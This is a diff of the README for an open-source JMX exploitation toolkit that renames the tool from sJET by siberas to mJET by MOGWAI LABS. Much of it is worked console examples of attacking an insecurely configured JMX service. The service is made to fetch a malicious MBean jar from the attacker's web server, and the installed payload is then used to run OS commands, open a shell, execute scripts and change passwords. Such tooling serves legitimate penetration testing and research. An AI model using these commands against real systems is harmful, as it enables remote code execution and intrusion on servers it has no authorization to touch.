@@ -1,8 +1,8 @@
-# sJET by siberas
+# mJET by MOGWAI LABS
 
-siberas JMX Exploitation Toolkit
+MOGWAI LABS JMX Exploitation Toolkit
 
-sJET allows an easy exploitation of insecure configured JMX services. Additional background
+mJET allows an easy exploitation of insecure configured JMX services. Additional background
 information can be found [here](https://www.optiv.com/blog/exploiting-jmx-rmi) and [here](https://www.owasp.org/images/c/c1/JMX_-_Java_Management_Extensions_-_Hans-Martin_Muench.pdf).
 
 ## Prerequisites
@@ -46,14 +46,14 @@ Where
 
 In the following example, the vulnerable JMX service runs on the 192.168.11.136:9991, the attacker has
 the IP address 192.168.11.132. The JMX service will connect to the web service of the attacker to download
-the payload jar file. sJET will start the necessary web service on port 8000.
+the payload jar file. mJET will start the necessary web service on port 8000.
 
 After the successful installation of the MBean, the default password is changed to the password that was provided
 at the command line ("super_secret").
 
 ```
 h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000
-sJET - siberas JMX Exploitation Toolkit
+mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Starting webserver at port 8000
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
@@ -62,10 +62,10 @@ sJET - siberas JMX Exploitation Toolkit
 [+] Loading malicious MBean from http://192.168.11.132:8000
 [+] Invoking: javax.management.loading.MLet.getMBeansFromURL
 192.168.11.136 - - [22/Aug/2017 22:38:00] "GET / HTTP/1.1" 200 -
-192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /siberas_mlet.jar HTTP/1.1" 200 -
-[+] Successfully loaded MBeanSiberas:name=payload,id=1
+192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /mogwailabs_mlet.jar HTTP/1.1" 200 -
+[+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
 [+] Changing default password...
-[+] Loaded de.siberas.lab.SiberasPayload
+[+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Successfully changed password
 
 h0ng10@rocksteady:~/sjet$
@@ -74,7 +74,7 @@ h0ng10@rocksteady:~/sjet$
 Installation with JMX credentials (also needs a weak configuration of the server):
 ```
 h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
-sJET - siberas JMX Exploitation Toolkit
+mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Starting webserver at port 8000
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
@@ -84,10 +84,10 @@ sJET - siberas JMX Exploitation Toolkit
 [+] Loading malicious MBean from http://192.168.11.132:8000
 [+] Invoking: javax.management.loading.MLet.getMBeansFromURL
 192.168.11.136 - - [22/Aug/2017 22:38:00] "GET / HTTP/1.1" 200 -
-192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /siberas_mlet.jar HTTP/1.1" 200 -
-[+] Successfully loaded MBeanSiberas:name=payload,id=1
+192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /mogwailabs_mlet.jar HTTP/1.1" 200 -
+[+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
 [+] Changing default password...
-[+] Loaded de.siberas.lab.SiberasPayload
+[+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Successfully changed password
 
 h0ng10@rocksteady:~/sjet$
@@ -99,11 +99,11 @@ After the payload was installed, we can use it to execute OS commands on the tar
 
 ```
 h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret command "ls -la"
-sJET - siberas JMX Exploitation Toolkit
+mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
 [+] Connected: rmi://192.168.11.132  2
-[+] Loaded de.siberas.lab.SiberasPayload
+[+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Executing command: ls -la
 total 16
 drwxr-xr-x  4 root    root    4096 Aug 22 16:12 .
@@ -125,13 +125,13 @@ to get a limited command shell.
 
 ```
 h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret shell
-sJET - siberas JMX Exploitation Toolkit
+mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
 [+] Connected: rmi://192.168.11.132  3
 [+] Use command 'exit_shell' to exit the shell
 >>> ping -c 3 127.0.0.1
-[+] Loaded de.siberas.lab.SiberasPayload
+[+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Executing command: ping -c 3 127.0.0.1
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.075 ms
@@ -155,11 +155,11 @@ service. It can be invoked as follows:
 
 ```
 h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret javascript scripts/javaproperties.js
-sJET - siberas JMX Exploitation Toolkit
+mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
 [+] Connected: rmi://192.168.11.132  4
-[+] Loaded de.siberas.lab.SiberasPayload
+[+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Executing script
 java.vendor=Oracle Corporation
 sun.java.launcher=SUN_STANDARD
@@ -182,11 +182,11 @@ Change the existing password ("super_secret") to "this-is-the-new-password":
 
 ```
 h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret password this-is-the-new-password
-sJET - siberas JMX Exploitation Toolkit
+mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
 [+] Connected: rmi://192.168.11.132  6
-[+] Loaded de.siberas.lab.SiberasPayload
+[+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Successfully changed password
 
 [+] Done
@@ -196,11 +196,11 @@ h0ng10@rocksteady:~/sjet$
 ### Uninstall the payload MBean from the target
 
 
-Uninstall the payload 'Siberas' from the target:
+Uninstall the payload 'MogwaiLabs' from the target:
 
 ```
 minmaxer@prellermbp:~/sjet$ jython sjet.py 192.168.1.101 9010 super_secret uninstall
-sJET - siberas JMX Exploitation Toolkit
+mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.1.101:9010/jmxrmi
 [+] Connected: rmi://192.168.1.1  16
